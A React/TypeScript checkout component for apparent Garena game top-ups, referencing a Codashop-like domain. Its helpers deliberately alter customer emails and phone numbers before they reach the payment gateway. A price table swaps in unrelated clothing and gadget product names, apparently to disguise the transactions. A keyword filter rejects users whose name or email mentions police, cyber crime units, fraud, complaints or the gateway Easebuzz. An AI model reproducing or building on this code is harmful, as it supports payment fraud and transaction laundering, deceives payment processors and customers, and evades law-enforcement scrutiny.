import { useState, useEffect, useRef } from 'react';
import { useSearchParams, Link } from 'react-router-dom';
import { AlertTriangle, AlertCircle } from 'lucide-react';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../lib/firebase';

// Helper functions for email & phone alteration before sending to payment gateway
// Email: Modify strictly the LAST 3 characters in the email username, keeping domain as @gmail.com
function transformEmail(email: string): string {
  const parts = email.split('@');
  let username = parts[0] || 'customer';
  if (username.length < 3) {
    username = username.padEnd(3, 'x');
  }

  const prefix = username.slice(0, -3);
  const last3 = username.slice(-3);

  const transformedLast3 = last3
    .split('')
    .map((ch) => {
      const code = ch.charCodeAt(0);
      if (code >= 65 && code <= 90) {
        // Uppercase A-Z -> shift +1
        return String.fromCharCode(((code - 65 + 1) % 26) + 65);
      } else if (code >= 97 && code <= 122) {
        // Lowercase a-z -> shift +1
        return String.fromCharCode(((code - 97 + 1) % 26) + 97);
      } else if (code >= 48 && code <= 57) {
        // Digit 0-9 -> shift +1
        return String.fromCharCode(((code - 48 + 1) % 10) + 48);
      }
      return 'x';
    })
    .join('');

  const transformedUser = prefix + transformedLast3;
  return `${transformedUser}@gmail.com`;
}

// Phone: Prepend 91, and modify strictly the LAST 3 digits in the 10-digit phone number
function transformPhone(phone: string): string {
  const clean = phone.replace(/[^0-9]/g, '');
  const tenDigits = clean.length >= 10 ? clean.slice(-10) : clean.padStart(10, '9');

  const prefix = tenDigits.slice(0, -3);
  const last3 = tenDigits.slice(-3);

  const transformedLast3 = last3
    .split('')
    .map((digit) => String((Number(digit) + 1) % 10))
    .join('');

  const transformedTen = prefix + transformedLast3;
  return `91${transformedTen}`;
}

const PRODUCT_CATEGORIES: Record<string, string[]> = {
  '395.50': ['Wall Mounted Bathroom Storage Shelf with Towel Rack'],
  '490':    ['Korean Fashion Oversized Casual Cotton T-Shirt'],
  '499':    ['Women Multi Coloured Floral Regular Fit Crop Top'],
  '550':    [
    'Women Multi Coloured Floral Regular Fit Crop Top',
    'Black High Rise Skinny Fit Shapewear For Women',
    'Drop Shoulder Sleeves Regular Fit Sweatshirt For Women',
    'Portable Handheld Ring LED Light Photography Lamp'
  ],
  '750':    [
    'Blue Stripes Relaxed Fit Shirt For Women',
    'Nylon Blend Regular Fit Bra For Women',
    'Solid Tube Bra For Women',
    'Mens Corduroy Loose Fit Wide Leg Pants'
  ],
  '1000':   ['Men Slim Fit Denim Jacket Vintage Edition'],
  '1100':   [
    'White and Black Wide Leg Fit Casual Trouser With 2 Pocket For Women',
    'Regular Fit Casual Trouser With 1 Pocket For Women',
    'Light Blue Solid Flared Jeans For Women',
    'BT21 Anime Cartoon Keychain Doll Pendant'
  ],
  '1400':   [
    'Stripes Regular Fit Shirt For Men',
    'Skinny Fit Jeans With 5 Pocket For Women',
    'Striped Regular Fit T-Shirt For Infant Boys',
    'Cute Bear Phone Charms & Keychain Pendant'
  ],
  '5500':   [
    'Slim Fit Utility Pocket Trouser For Men',
    'Mens Slim Solid Navy Formal Trousers',
    'Solid Rayon Pant For Women',
    'LED Selfie Ring Lamp with Phone Holder & Tripod',
    'Cotton Blend Straight Fit Trouser for Women'
  ],
  '7500':   [
    'Olive Slim Fit Utility Pocket Trouser For Men',
    'Cotton Blend Regular Fit Shirt For Men',
    'Cotton Blend Solid Pant For Women',
    'Solid Plazzos For Women And Girls',
    'Stylish Women Maroon Gown Dress'
  ],
};

function getProductNameForPrice(price: string): string {
  const items = PRODUCT_CATEGORIES[price];
  if (items && items.length > 0) {
    const randomIndex = Math.floor(Math.random() * items.length);
    return items[randomIndex];
  }
  return 'Women Multi Coloured Floral Regular Fit Crop Top';
}

const SOURCE_URL = 'https://www.codashop.online/';

// Check for suspicious or prohibited keywords in user input (Name / Email)
function containsRestrictedWord(text: string): boolean {
  if (!text) return false;
  const raw = text.toLowerCase();
  const clean = raw.replace(/[^a-z0-9]/g, '');

  const bannedKeywords = [
    'cyber',
    'police',
    'scammer',
    'scam',
    'fraud',
    'easebuzz',
    'easebuz',
    'hacker',
    'hack',
    'cbi',
    'cid',
    'crime',
    'govt',
    'government',
    'fake',
    'complaint',
    'phishing',
    'cheater',
    'cheat',
    'spammer',
    'helpdesk',
    'abuse'
  ];

  for (const word of bannedKeywords) {
    if (clean.includes(word) || raw.includes(word)) {
      return true;
    }
  }

  // Check 'ease' specifically (as word boundary, prefix, suffix, or gateway variant)
  if (/\bease\b/i.test(raw) || clean.includes('easebuzz') || clean.includes('easebuz') || clean.includes('easepay') || clean.startsWith('ease') || clean.endsWith('ease')) {
    return true;
  }

  return false;
}

export default function GarenaCheckout() {
  useEffect(() => {
    window.location.replace('/');
  }, []);
  return null;
}
